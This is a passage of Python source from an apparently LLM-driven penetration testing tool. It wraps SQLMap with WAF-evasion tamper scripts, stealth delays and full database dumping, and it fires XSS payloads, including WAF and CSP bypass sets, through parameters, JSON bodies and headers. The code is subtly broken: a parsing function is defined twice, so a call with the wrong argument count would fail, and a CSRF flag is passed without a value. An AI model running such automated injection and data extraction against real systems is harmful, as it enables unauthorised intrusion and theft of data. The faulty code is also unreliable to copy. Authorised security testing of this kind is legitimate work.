        
        config = campaign_configs.get(campaign_mode, campaign_configs["comprehensive"])
        
        # Apply campaign configuration
        cmd.extend([
            f'--level={config["level"]}',
            f'--risk={config["risk"]}',
            f'--technique={config["technique"]}',
            f'--timeout={config["timeout"]}',
            f'--threads={config["threads"]}',
            '--retries=3'
        ])
        
        # Add stealth delay if needed
        if config.get("delay"):
            cmd.extend([f'--delay={config["delay"]}'])
        
        # Context-aware enhancements
        tampers = []
        
        # Database-specific optimizations
        if target_context.database:
            db_type = target_context.database.lower()
            if db_type == "mysql":
                cmd.extend(['--dbms=mysql'])
                tampers.extend(['space2comment', 'versionedkeywords'])
            elif db_type == "postgresql":
                cmd.extend(['--dbms=postgresql'])
                tampers.extend(['space2comment'])
            elif db_type == "mssql":
                cmd.extend(['--dbms=mssql'])
                tampers.extend(['space2comment', 'charencode'])
            elif db_type == "oracle":
                cmd.extend(['--dbms=oracle'])
                tampers.extend(['space2comment'])
            elif db_type == "sqlite":
                cmd.extend(['--dbms=sqlite'])
        
        # Framework-specific optimizations
        if target_context.framework:
            framework = target_context.framework.lower()
            if framework in ["django", "rails"]:
                # These frameworks often use CSRF tokens
                cmd.extend(['--csrf-token', '--csrf-url'])
            elif framework == "laravel":
                # Laravel uses specific error patterns
                tampers.append('space2mysqlblank')
        
        # WAF bypass techniques
        if target_context.has_waf:
            tampers.extend(['space2comment', 'charencode', 'randomcase', 'between'])
            cmd.extend(['--random-agent', '--delay=2'])
        else:
            cmd.extend(['--random-agent'])
        
        # Apply tamper scripts
        if tampers:
            cmd.extend(['--tamper', ','.join(tampers)])
        
        # Custom encoding if specified
        if target_context.payload_encoding:
            if target_context.payload_encoding == 'url':
                cmd.extend(['--tamper=charencode'])
            elif target_context.payload_encoding == 'base64':
                cmd.extend(['--tamper=base64encode'])
        
        # Authentication handling
        if target_context.authentication_type:
            auth_type = target_context.authentication_type.lower()
            if auth_type == "cookie" and options and options.get('cookie'):
                cmd.extend(['--cookie', options['cookie']])
            elif auth_type == "bearer" and options and options.get('auth_header'):
                cmd.extend(['--header', f"Authorization: Bearer {options['auth_header']}"])
            elif auth_type == "basic" and options and options.get('auth_creds'):
                cmd.extend(['--auth-type', 'basic', '--auth-cred', options['auth_creds']])
        
        # Custom headers from context
        if target_context.custom_headers:
            for key, value in target_context.custom_headers.items():
                cmd.extend(['--header', f'{key}: {value}'])
        
        # Standard SQLMap options
        cmd.extend([
            '--flush-session',
            '--fresh-queries',
            '--answers=quit=N,crack=N,dict=N,continue=Y',
            '--banner',
            '--current-user',
            '--current-db'
        ])
        
        # Enhanced data extraction based on context
        if campaign_mode in ["comprehensive", "aggressive"]:
            cmd.extend(['--dbs', '--tables', '--columns', '--dump-all'])
        else:
            cmd.extend(['--dbs', '--tables'])
        
        # Legacy options support (backward compatibility)
        if options:
            if options.get('data'):
                cmd.extend(['--data', options['data']])
            if options.get('headers'):
                for header in options['headers']:
                    cmd.extend(['--header', header])
            if options.get('cookie') and not target_context.authentication_type:
                cmd.extend(['--cookie', options['cookie']])
            if options.get('proxy'):
                cmd.extend(['--proxy', options['proxy']])
        
        # Execute SQLMap
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=900,  # 15 minutes
            cwd=current_dir
        )
        
        output = process.stdout
        error_output = process.stderr
        
        # Enhanced parsing with context awareness
        vulnerabilities = _parse_sqlmap_output(output, error_output, url, target_context)
        
        # Save detailed output
        if output:
            _save_sqlmap_results(output, url)
        
        execution_time = time.time() - start_time
        
        # Calculate enhanced business impact
        business_impact = _assess_sql_business_impact(vulnerabilities, target_context.to_dict())
        
        return ToolCallResult(
            success=True,
            tool_name="SQLMap Campaign",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'sqlmap_version': 'dev',
                'campaign_mode': campaign_mode,
                'target_context': target_context.to_dict(),
                'command_used': ' '.join(cmd[:15]) + '...',
                'output_length': len(output),
                'tampers_used': tampers,
                'context_optimizations': {
                    'database_specific': bool(target_context.database),
                    'framework_specific': bool(target_context.framework),
                    'waf_bypass': target_context.has_waf,
                    'authentication': bool(target_context.authentication_type)
                }
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk=_assess_sqlmap_compliance_risk(vulnerabilities, target_context)
        )
        
    except subprocess.TimeoutExpired:
        return ToolCallResult(
            success=False,
            tool_name="SQLMap Campaign",
            error=f"SQLMap {campaign_mode} campaign timed out",
            execution_time=time.time() - start_time,
            vulnerabilities=[{
                'type': 'SQL Injection Testing',
                'severity': 'Info',
                'evidence': f'SQLMap {campaign_mode} campaign timed out - target may be protected or testing too comprehensive'
            }]
        )
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="SQLMap Campaign",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _parse_sqlmap_output(output: str, error_output: str, url: str, 
                                target_context: PayloadTargetContext) -> List[Vulnerability]:
    vulnerabilities = []
    
    # Parse basic SQLMap output first
    base_vulns = _parse_sqlmap_output(output, error_output, url)
    
    for vuln in base_vulns:
        if isinstance(vuln, dict):
            vuln = Vulnerability.from_dict(vuln)
        
        # Enhance with context-specific analysis
        if target_context.framework:
            # Add framework-specific remediation
            if vuln.remediation:
                vuln.remediation += f"\n\nFramework-specific guidance for {target_context.framework}:"
                if target_context.framework.lower() == "django":
                    vuln.remediation += "\n- Use Django ORM instead of raw SQL queries"
                    vuln.remediation += "\n- Enable SQL query logging for monitoring"
                elif target_context.framework.lower() == "laravel":
                    vuln.remediation += "\n- Use Eloquent ORM or Query Builder"
                    vuln.remediation += "\n- Implement proper input validation with Form Requests"
                elif target_context.framework.lower() == "rails":
                    vuln.remediation += "\n- Use ActiveRecord instead of raw SQL"
                    vuln.remediation += "\n- Enable strong parameters for input filtering"
        
        # Database-specific enhancements
        if target_context.database and vuln.dbms != target_context.database:
            vuln.dbms = target_context.database
        
        # WAF detection impact
        if target_context.has_waf:
            if vuln.evidence:
                vuln.evidence += " [WAF bypass techniques were applied]"
        
        # Business impact enhancement based on context
        if target_context.cms or target_context.framework:
            if not vuln.business_impact:
                vuln.business_impact = "High - SQL injection in web application framework"
        
        vulnerabilities.append(vuln)
    
    # Context-specific vulnerability detection
    if target_context.database:
        db_specific_vulns = _detect_database_specific_issues(output, target_context.database, url)
        vulnerabilities.extend(db_specific_vulns)
    
    if target_context.framework:
        framework_vulns = _detect_framework_specific_issues(output, target_context.framework, url)
        vulnerabilities.extend(framework_vulns)
    
    return vulnerabilities

def _detect_database_specific_issues(output: str, database: str, url: str) -> List[Vulnerability]:
    """Detect database-specific security issues from SQLMap output"""
    vulnerabilities = []
    output_lower = output.lower()
    
    db_issues = {
        'mysql': {
            'file_privileges': ['file_priv', 'load_file', 'into outfile'],
            'admin_access': ['mysql.user', 'create user', 'grant all']
        },
        'postgresql': {
            'file_access': ['copy', 'pg_read_file', 'pg_ls_dir'],
            'code_execution': ['create function', 'plpythonu', 'plperlu']
        },
        'mssql': {
            'command_execution': ['xp_cmdshell', 'sp_oacreate', 'openrowset'],
            'file_access': ['bulk insert', 'openrowset']
        },
        'oracle': {
            'java_execution': ['dbms_java', 'create java'],
            'file_access': ['utl_file', 'dbms_lob']
        }
    }
    
    if database.lower() in db_issues:
        for issue_type, indicators in db_issues[database.lower()].items():
            for indicator in indicators:
                if indicator in output_lower:
                    vulnerabilities.append(Vulnerability(
                        type=f'{database.upper()} {issue_type.replace("_", " ").title()}',
                        severity='Critical',
                        evidence=f'SQLMap detected {indicator} functionality - potential for {issue_type}',
                        url=url,
                        dbms=database,
                        tool='SQLMap Enhanced',
                        business_impact=f'Critical - {issue_type} detected in {database} database'
                    ))
    
    return vulnerabilities

def _detect_framework_specific_issues(output: str, framework: str, url: str) -> List[Vulnerability]:
    """Detect framework-specific security issues"""
    vulnerabilities = []
    output_lower = output.lower()
    
    framework_patterns = {
        'django': ['django_session', 'django_admin_log', 'auth_user'],
        'laravel': ['migrations', 'password_resets', 'users'],
        'rails': ['schema_migrations', 'active_record', 'sessions'],
        'wordpress': ['wp_users', 'wp_posts', 'wp_options'],
        'drupal': ['users', 'node', 'variable']
    }
    
    if framework.lower() in framework_patterns:
        patterns = framework_patterns[framework.lower()]
        detected_tables = [p for p in patterns if p in output_lower]
        
        if detected_tables:
            vulnerabilities.append(Vulnerability(
                type=f'{framework.title()} Framework Exposure',
                severity='High',
                evidence=f'SQLMap detected {framework} framework tables: {", ".join(detected_tables)}',
                url=url,
                tool='SQLMap Enhanced',
                technique='Framework fingerprinting',
                business_impact=f'High - {framework} framework structure exposed'
            ))
    
    return vulnerabilities

def _assess_sqlmap_compliance_risk(vulnerabilities: List[Vulnerability], 
                                 target_context: PayloadTargetContext) -> str:
    """Assess compliance risk based on SQLMap findings and context"""
    risk_factors = []
    
    # Check for critical SQL injection vulnerabilities
    critical_sqli = [v for v in vulnerabilities if v.severity == 'Critical' and 'injection' in v.type.lower()]
    if critical_sqli:
        risk_factors.append("Critical SQL injection vulnerabilities detected")
    
    # Database-specific compliance risks
    if target_context.database:
        db = target_context.database.lower()
        if db in ['mysql', 'postgresql', 'mssql', 'oracle']:
            risk_factors.append(f"Production {db} database potentially compromised")
    
    # Framework-specific risks
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework in ['django', 'rails', 'laravel']:
            risk_factors.append(f"Web application framework ({framework}) vulnerable to SQL injection")
    
    # CMS-specific risks
    if target_context.cms:
        cms = target_context.cms.lower()
        if cms in ['wordpress', 'drupal', 'joomla']:
            risk_factors.append(f"Content Management System ({cms}) security breach")
    
    # WAF bypass implications
    if target_context.has_waf:
        waf_bypass_vulns = [v for v in vulnerabilities if 'bypass' in v.evidence.lower()]
        if waf_bypass_vulns:
            risk_factors.append("WAF protection circumvented")
    
    # Compliance framework mapping
    compliance_risks = []
    if len(risk_factors) > 0:
        compliance_risks.extend([
            "PCI DSS: Requirement 6.5.1 (Injection Flaws) violated",
            "OWASP Top 10: A03:2021 Injection vulnerability confirmed",
            "ISO 27001: Information security controls compromised"
        ])
        
        if target_context.cms or any('user' in v.evidence.lower() for v in vulnerabilities):
            compliance_risks.append("GDPR: Personal data protection at risk")
        
        if target_context.database and any('admin' in v.evidence.lower() for v in vulnerabilities):
            compliance_risks.append("SOX: Data integrity controls bypassed")
    
    return "; ".join(compliance_risks) if compliance_risks else "Low compliance risk - no critical SQL injection detected"

def _detect_sql_vulnerability(response: requests.Response, url: str, parameter: str, 
                                   payload: str, method: str, framework: str = None, 
                                   database_type: str = None) -> Optional[Vulnerability]:
    """
    Enhanced SQL injection detection with context awareness for LLM-generated testing
    
    Args:
        response: HTTP response to analyze
        url: Target URL
        parameter: Parameter name tested
        payload: SQL payload used
        method: HTTP method used
        framework: Framework type (Django, Laravel, etc.)
        database_type: Database type (MySQL, PostgreSQL, etc.)
    
    Returns:
        Vulnerability object if SQL injection detected, None otherwise
    """
    response_text = response.text.lower()
    status_code = response.status_code
    response_time = getattr(response, 'elapsed', None)
    
    # Framework-specific error patterns
    framework_errors = {
        'django': ['django.db.utils', 'operationalerror', 'integrityerror'],
        'laravel': ['illuminate\\database', 'queryexception', 'sqlstate'],
        'rails': ['activerecord::', 'mysql2::error', 'pg::error'],
        'express': ['sequelize', 'knex', 'typeorm'],
        'spring': ['org.springframework.dao', 'hibernateexception', 'sqlexception']
    }
    
    # Database-specific error patterns
    db_errors = {
        'mysql': ['mysql_fetch', 'mysql_num_rows', 'you have an error in your sql syntax'],
        'postgresql': ['pg_query', 'pg_fetch', 'postgresql query failed'],
        'mssql': ['microsoft ole db', 'sqlserver', 'system.data.sqlclient'],
        'oracle': ['ora-', 'oracle error', 'oci_execute'],
        'sqlite': ['sqlite3', 'sqlite_', 'database is locked']
    }
    
    # Smart detection logic
    vulnerability_indicators = []
    severity = 'Medium'
    confidence = 0.0
    
    # 1. Error-based detection with context
    if framework and framework.lower() in framework_errors:
        for error_pattern in framework_errors[framework.lower()]:
            if error_pattern in response_text:
                vulnerability_indicators.append(f'Framework-specific error: {error_pattern}')
                confidence += 0.3
                severity = 'High'
    
    if database_type and database_type.lower() in db_errors:
        for error_pattern in db_errors[database_type.lower()]:
            if error_pattern in response_text:
                vulnerability_indicators.append(f'Database-specific error: {error_pattern}')
                confidence += 0.4
                severity = 'High'
    
    # 2. Generic SQL error detection
    sql_error_patterns = [
        'syntax error', 'mysql_fetch_array', 'ora-01756', 'quoted string not properly terminated',
        'unclosed quotation mark', 'unexpected end of sql command', 'mysql server version for the right syntax',
        'warning: mysql_', 'warning: pg_', 'postgresqlerror', 'sqlstate', 'error in your sql syntax'
    ]
    
    for pattern in sql_error_patterns:
        if pattern in response_text:
            vulnerability_indicators.append(f'SQL error pattern: {pattern}')
            confidence += 0.2
    
    # 3. Union-based detection
    union_indicators = ['mysql', 'version()', 'user()', 'database()', 'information_schema']
    union_matches = sum(1 for indicator in union_indicators if indicator in response_text)
    if union_matches >= 2:
        vulnerability_indicators.append(f'Union injection indicators: {union_matches} matches')
        confidence += 0.3
        severity = 'Critical'
    
    # 4. Boolean-based detection (response differences)
    if status_code != 200 and '1=1' in payload:
        vulnerability_indicators.append('Boolean-based response difference')
        confidence += 0.25
    
    # 5. Time-based detection
    if response_time and hasattr(response_time, 'total_seconds'):
        response_seconds = response_time.total_seconds()
        if 'sleep(' in payload.lower() or 'waitfor delay' in payload.lower():
            if response_seconds > 5:  # Significant delay
                vulnerability_indicators.append(f'Time-based delay: {response_seconds:.2f}s')
                confidence += 0.4
                severity = 'High'
    
    # 6. Advanced detection for NoSQL
    if 'nosql' in payload.lower() or '$' in payload:
        nosql_errors = ['mongodb', 'parseerror', 'bsonerror', 'mongod', 'couchdb']
        for error in nosql_errors:
            if error in response_text:
                vulnerability_indicators.append(f'NoSQL injection error: {error}')
                confidence += 0.3
                severity = 'High'
    
    # 7. Second-order detection (stored XSS patterns in SQL context)
    if 'script' in response_text and 'alert' in response_text:
        vulnerability_indicators.append('Potential second-order injection via stored XSS')
        confidence += 0.2
    
    # Determine if vulnerability exists
    if confidence >= 0.3 or len(vulnerability_indicators) >= 2:
        # Calculate CVSS score based on severity and context
        cvss_score = _calculate_sql_cvss_score(severity, framework, database_type, vulnerability_indicators)
        
        # Generate context-aware remediation
        remediation = _generate_sql_remediation(framework, database_type, vulnerability_indicators)
        
        return Vulnerability(
            type='SQL Injection',
            severity=severity,
            evidence=f'SQL injection detected via {method} parameter "{parameter}". Indicators: {"; ".join(vulnerability_indicators)}',
            cvss_score=cvss_score,
            url=url,
            parameter=parameter,
            payload=payload,
            response_code=status_code,
            location=f'{method} parameter',
            tool='Smart SQL Detection',
            technique=_determine_sql_technique(payload, vulnerability_indicators),
            dbms=database_type,
            business_impact=f'Critical data exposure risk in {framework or "unknown"} application',
            remediation=remediation,
            references=['CWE-89', 'OWASP-A03-2021']
        )
    
    return None

def _calculate_sql_cvss_score(severity: str, framework: str, database_type: str, indicators: List[str]) -> float:

    base_scores = {'Critical': 9.0, 'High': 7.5, 'Medium': 5.0, 'Low': 3.0}
    score = base_scores.get(severity, 5.0)
    
    # Adjust based on framework (some frameworks have better protections)
    framework_adjustments = {
        'django': -0.5,  # Django ORM provides some protection
        'rails': -0.3,   # ActiveRecord has some protections
        'laravel': -0.2, # Eloquent ORM helps
        'asp.net': -0.4, # Entity Framework protections
        'custom': +0.5   # Custom applications often less protected
    }
    
    if framework and framework.lower() in framework_adjustments:
        score += framework_adjustments[framework.lower()]
    
    # Adjust based on database type
    if database_type == 'mysql' and any('union' in i.lower() for i in indicators):
        score += 0.3  # MySQL UNION injections can be particularly severe
    
    return min(10.0, max(0.0, score))

def _determine_sql_technique(payload: str, indicators: List[str]) -> str:

    payload_lower = payload.lower()
    
    if 'union' in payload_lower:
        return 'Union-based injection'
    elif 'sleep(' in payload_lower or 'waitfor delay' in payload_lower:
        return 'Time-based blind injection'
    elif any('error' in i.lower() for i in indicators):
        return 'Error-based injection'
    elif 'or 1=1' in payload_lower or 'and 1=1' in payload_lower:
        return 'Boolean-based blind injection'
    elif '$' in payload and any('mongo' in i.lower() for i in indicators):
        return 'NoSQL injection'
    else:
        return 'Classic SQL injection'

def _generate_sql_remediation(framework: str, database_type: str, indicators: List[str]) -> str:

    base_remediation = "Implement parameterized queries/prepared statements. "
    
    if framework:
        framework_specific = {
            'django': "Use Django ORM queries and avoid raw SQL. Enable Django's SQL injection protection.",
            'laravel': "Use Eloquent ORM or Query Builder with parameter binding. Avoid DB::raw() with user input.",
            'rails': "Use ActiveRecord with parameter binding. Avoid string interpolation in SQL queries.",
            'express': "Use parameterized queries with your database driver. Consider using an ORM like Sequelize.",
            'asp.net': "Use Entity Framework or parameterized SqlCommand objects. Enable .NET Core's built-in protections."
        }
        
        if framework.lower() in framework_specific:
            base_remediation += framework_specific[framework.lower()]
    
    if database_type:
        db_specific = {
            'mysql': "Enable MySQL's strict mode and consider using mysql_real_escape_string() as secondary defense.",
            'postgresql': "Use PostgreSQL's parameter placeholders ($1, $2, etc.) in prepared statements.",
            'mssql': "Use SQL Server's sp_executesql with parameter binding.",
            'oracle': "Use Oracle's bind variables in PL/SQL blocks.",
            'sqlite': "Use SQLite's parameter binding with ? placeholders."
        }
        
        if database_type.lower() in db_specific:
            base_remediation += " " + db_specific[database_type.lower()]
    
    return base_remediation

def _assess_sql_business_impact(vulnerabilities: List[Vulnerability], target_context: Dict[str, Any]) -> str:

    if not vulnerabilities:
        return "No SQL injection vulnerabilities detected"
    
    impact_factors = []
    severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
    
    for vuln in vulnerabilities:
        if isinstance(vuln, Vulnerability):
            severity_counts[vuln.severity] += 1
    
    # Base impact assessment
    if severity_counts['Critical'] > 0:
        impact_factors.append(f"CRITICAL: {severity_counts['Critical']} critical SQL injection vulnerabilities detected")
    if severity_counts['High'] > 0:
        impact_factors.append(f"HIGH: {severity_counts['High']} high-severity SQL injections found")
    
    # Context-based impact assessment
    if target_context:
        industry = target_context.get('industry', '').lower()
        data_types = target_context.get('data_types', [])
        compliance = target_context.get('compliance_frameworks', [])
        
        if industry in ['healthcare', 'finance', 'banking', 'government']:
            impact_factors.append(f"Enhanced risk due to {industry} industry regulations")
        
        if any(dt in ['pii', 'personal', 'financial', 'health'] for dt in data_types):
            impact_factors.append("Sensitive data exposure risk - PII/PHI/Financial data at risk")
        
        if compliance:
            impact_factors.append(f"Compliance violations: {', '.join(compliance)}")
    
    return "; ".join(impact_factors) if impact_factors else "Moderate business impact - SQL injection vulnerabilities detected"



def _parse_sqlmap_output(output: str, error_output: str, url: str) -> List[Vulnerability]:
    """Parse SQLMap output for vulnerabilities"""
    vulnerabilities = []
    
    try:
        lines = output.split('\n')
        
        # Check for SQL injection detection
        if any(phrase in output.lower() for phrase in [
            'is vulnerable', 'sqlmap identified', 'injection found',
            'parameter is vulnerable', 'payload worked'
        ]):
            injection_technique = 'Unknown'
            dbms_type = 'Unknown'
            
            for line in lines:
                line = line.strip()
                
                # Extract injection technique
                if 'technique:' in line.lower():
                    injection_technique = line.split(':', 1)[1].strip()
                elif any(tech in line.lower() for tech in ['boolean-based', 'error-based', 'union query', 'time-based']):
                    injection_technique = line.strip()
                
                # Extract DBMS information
                if 'back-end dbms:' in line.lower():
                    dbms_type = line.split(':', 1)[1].strip()
            
            vuln = create_vulnerability(
                vuln_type='SQL Injection',
                severity='Critical',
                evidence=f'SQLMap confirmed SQL injection using {injection_technique}',
                tool='SQLMap',
                technique=injection_technique,
                dbms=dbms_type,
                url=url,
                business_impact='Complete database compromise possible',
                remediation="Implement parameterized queries and WAF protection"
            )
            vulnerabilities.append(vuln)
        
        # Check for database enumeration
        if 'available databases' in output.lower():
            databases = _extract_databases_from_sqlmap_output(output)
            if databases:
                vuln = create_vulnerability(
                    vuln_type='Database Enumeration',
                    severity='High',
                    evidence=f'Successfully enumerated {len(databases)} databases: {", ".join(databases[:5])}',
                    tool='SQLMap',
                    url=url,
                    business_impact='Database structure exposed',
                    remediation="Restrict database user privileges and implement access controls"
                )
                vulnerabilities.append(vuln)
        
        # Check for data exfiltration
        if 'database table entries' in output.lower() or 'dumped table' in output.lower():
            vuln = create_vulnerability(
                vuln_type='Data Exfiltration',
                severity='Critical',
                evidence='Successfully extracted sensitive data from database',
                tool='SQLMap',
                url=url,
                business_impact='Sensitive data exposed',
                remediation="Implement data encryption and access logging"
            )
            vulnerabilities.append(vuln)
        
        # Check for OS command execution
        if 'os-shell' in output.lower() or 'operating system' in output.lower():
            vuln = create_vulnerability(
                vuln_type='OS Command Execution',
                severity='Critical',
                evidence='Potential OS shell access through SQL injection',
                tool='SQLMap',
                url=url,
                business_impact='Complete system compromise',
                remediation="Disable dangerous database functions and implement sandboxing"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error parsing SQLMap output: {e}")
    
    return vulnerabilities

def _extract_databases_from_sqlmap_output(output: str) -> List[str]:
    """Extract database names from SQLMap output"""
    databases = []
    capture = False
    
    for line in output.split('\n'):
        line = line.strip()
        if 'available databases' in line.lower():
            capture = True
            continue
        elif capture:
            if line.startswith('[') and ']' in line:
                db_name = line.split(']')[0].replace('[', '').strip()
                if db_name and db_name not in ['*', '+', '-']:
                    databases.append(db_name)
            elif not line or line.startswith('[INFO]'):
                capture = False
    
    return databases

def _save_sqlmap_results(output: str, url: str):
    """Save SQLMap results for analysis"""
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = int(time.time())
        filename = f"sqlmap_scan_{timestamp}.txt"
        filepath = results_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"SQLMap Scan Results\n")
            f.write(f"Target URL: {url}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
            f.write(output)
        
        logging.info(f"SQLMap results saved to {filepath}")
        
    except Exception as e:
        logging.error(f"Error saving SQLMap results: {e}")

# ===== XSS TESTING FUNCTIONS =====

def xss_test(url: str, parameter: str = "search", payloads: List[str] = None, 
             target_context: Union[PayloadTargetContext, Dict[str, Any]] = None,
             test_mode: str = "basic") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Use LLM-provided payloads or smart selection from PayloadLibrary
        if not payloads:
            payloads = []
            
            # Base critical payloads
            payloads.extend(PayloadLibrary.XSS_ADVANCED['critical'][:3])
            
            # Context-specific payload selection
            if target_context.framework:
                framework = target_context.framework.lower()
                if framework in ['angular', 'react', 'vue']:
                    # Modern JS framework bypasses
                    payloads.extend(PayloadLibrary.XSS_ADVANCED['framework_bypass'][:2])
                elif framework in ['django', 'flask']:
                    # Python template engines
                    payloads.extend([payload for payload in PayloadLibrary.XSS_ADVANCED['framework_bypass'] 
                                   if '{{' in payload or '{%' in payload][:1])
                elif framework in ['laravel', 'symfony']:
                    # PHP framework bypasses
                    payloads.extend([payload for payload in PayloadLibrary.XSS_ADVANCED['framework_bypass'] 
                                   if 'php' in payload.lower()][:1])
            
            # WAF bypass payloads if WAF detected
            if target_context.has_waf:
                payloads.extend(PayloadLibrary.XSS_ADVANCED['waf_bypass'][:3])
            
            # CSP bypass if modern web app
            if target_context.language in ['javascript', 'typescript'] or target_context.framework:
                payloads.extend(PayloadLibrary.XSS_ADVANCED['csp_bypass'][:2])
            
            # CMS-specific payloads
            if target_context.cms:
                cms = target_context.cms.lower()
                if cms in ['wordpress', 'drupal', 'joomla']:
                    # Common CMS bypasses
                    payloads.extend(PayloadLibrary.XSS_ADVANCED['event_handlers'][:2])
            
            # JSON payload support
            if target_context.supports_json:
                json_payloads = [
                    '{"search":"<svg/onload=alert(\'XSS\')>"}',
                    '{"data":"<img src=x onerror=alert(\'XSS\')>"}'
                ]
                payloads.extend(json_payloads)
            
            # Fallback if no smart selection worked
            if len(payloads) <= 3:
                payloads.extend([
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg/onload=alert('XSS')>"
                ])
        
        # Extract context for smart testing
        framework = target_context.framework or 'unknown'
        language = target_context.language or 'unknown'
        
        for test_payload in payloads:
            # Context-aware testing approach
            vulnerabilities.extend(_test_xss_requests(
                session, url, parameter, test_payload, target_context
            ))
            time.sleep(0.2)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        # Enhanced business impact assessment
        business_impact = _assess_xss_business_impact(vulnerabilities, target_context)
        
        return ToolCallResult(
            success=True,
            tool_name="XSS Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'test_mode': test_mode,
                'payloads_tested': len(payloads),
                'target_context': target_context.to_dict(),
                'framework': framework,
                'language': language,
                'context_optimizations': {
                    'framework_specific': bool(target_context.framework),
                    'waf_bypass': target_context.has_waf,
                    'json_support': target_context.supports_json,
                    'cms_specific': bool(target_context.cms)
                }
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score for v in vulnerabilities if isinstance(v, Vulnerability)] + [0.0]),
            compliance_risk=_assess_xss_compliance_risk(vulnerabilities, target_context)
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="XSS Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _test_xss_requests(session: requests.Session, url: str, parameter: str, 
                           payload: str, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Context-aware XSS testing function with smart method selection"""
    vulnerabilities = []
    
    # Base test methods
    test_methods = []
    
    # Always test GET
    test_methods.append(('GET', lambda: session.get(f"{url}?{parameter}={urllib.parse.quote(payload)}")))
    
    # Test POST if supported
    if target_context.supports_post:
        if target_context.supports_json:
            # JSON payload testing
            json_payload = {parameter: payload}
            test_methods.append(('POST-JSON', lambda: session.post(url, 
                json=json_payload, 
                headers={'Content-Type': 'application/json'})))
        else:
            # Standard form data
            test_methods.append(('POST', lambda: session.post(url, data={parameter: payload})))
    
    # Header-based testing for specific contexts
    header_test_conditions = [
        target_context.framework and target_context.framework.lower() in ['express', 'koa', 'fastify'],  # Node.js frameworks
        target_context.language == 'javascript',
        target_context.web_server and target_context.web_server.lower() in ['nginx', 'apache']
    ]
    
    if any(header_test_conditions):
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        # Add framework-specific headers
        if target_context.framework:
            framework = target_context.framework.lower()
            if framework in ['express', 'koa']:
                headers_to_test.extend(['X-Requested-With', 'Origin'])
            elif framework in ['django', 'flask']:
                headers_to_test.extend(['X-CSRFToken', 'X-Requested-With'])
        
        for header in headers_to_test:
            test_methods.append((f'HEADER-{header}', 
                               lambda h=header: session.get(url, headers={h: payload})))
    
    # Custom headers from context
    if target_context.custom_headers:
        for header_name in target_context.custom_headers.keys():
            test_methods.append((f'CUSTOM-HEADER-{header_name}', 
                               lambda h=header_name: session.get(url, headers={h: payload})))
    
    # Execute tests
    for method_name, test_func in test_methods:
        try:
            response = test_func()
            
            if _detect_xss_vulnerability(response, payload, method_name, target_context):
                # Context-aware classification
                xss_type, severity = _classify_xss_vulnerability(
                    response, payload, method_name, session, url, target_context
                )
                
                vuln = create_vulnerability(
                    vuln_type=xss_type,
                    severity=severity,
                    evidence=f'XSS payload reflected via {method_name} in {target_context.framework or "unknown"} context',
                    location=f'{method_name} parameter' if not method_name.startswith('HEADER') else method_name,
                    parameter=parameter if not method_name.startswith('HEADER') else method_name.split('-')[-1],
                    payload=payload,
                    url=response.url,
                    response_code=response.status_code,
                    technique=_determine_xss_technique(payload, target_context),
                    remediation=_get_xss_remediation(xss_type, method_name, target_context),
                    business_impact=_get_xss_business_impact_per_vuln(xss_type, target_context)
                )
                vulnerabilities.append(vuln)
                
        except Exception as e:
            logging.error(f"Error testing XSS via {method_name}: {e}")
    
    return vulnerabilities

def _detect_xss_vulnerability(response: requests.Response, payload: str, method: str, 
                                      target_context: PayloadTargetContext) -> bool:
    """Enhanced XSS detection with framework and context awareness"""
    response_text = response.text.lower()
    payload_lower = payload.lower()
    
    # Basic detection patterns
    detection_patterns = [
        payload_lower in response_text,  # Direct reflection
        payload.replace('<', '&lt;').replace('>', '&gt;') in response_text,  # HTML encoded
        urllib.parse.quote(payload).lower() in response_text,  # URL encoded
        payload.replace('"', '&quot;').replace("'", '&#x27;') in response_text,  # Attribute encoded
    ]
    
    # Framework-specific detection
    if target_context.framework:
        framework = target_context.framework.lower()
        
        # React/JSX specific patterns
        if framework in ['react', 'next']:
            jsx_patterns = [
                'dangerouslysetinnerhtml' in response_text and payload_lower in response_text,
                'react' in response_text and 'script' in payload_lower
            ]
            detection_patterns.extend(jsx_patterns)
        
        # Angular specific patterns
        elif framework == 'angular':
            angular_patterns = [
                'ng-bind-html' in response_text and payload_lower in response_text,
                'constructor' in payload_lower and response_text
            ]
            detection_patterns.extend(angular_patterns)
        
        # Vue specific patterns
        elif framework == 'vue':
            vue_patterns = [
                'v-html' in response_text and payload_lower in response_text,
                '{{' in payload and '}}' in payload and payload_lower in response_text
            ]
            detection_patterns.extend(vue_patterns)
    
    # JSON response specific detection
    if target_context.supports_json and 'application/json' in response.headers.get('content-type', ''):
        try:
            json_data = response.json()
            json_str = str(json_data).lower()
            detection_patterns.append(payload_lower in json_str)
        except:
            pass
    
    # Check for script execution context
    script_contexts = [
        '<script' in response_text and payload_lower in response_text,
        'onerror=' in response_text and 'alert(' in response_text,
        'onload=' in response_text and 'alert(' in response_text,
        'javascript:' in response_text
    ]
    
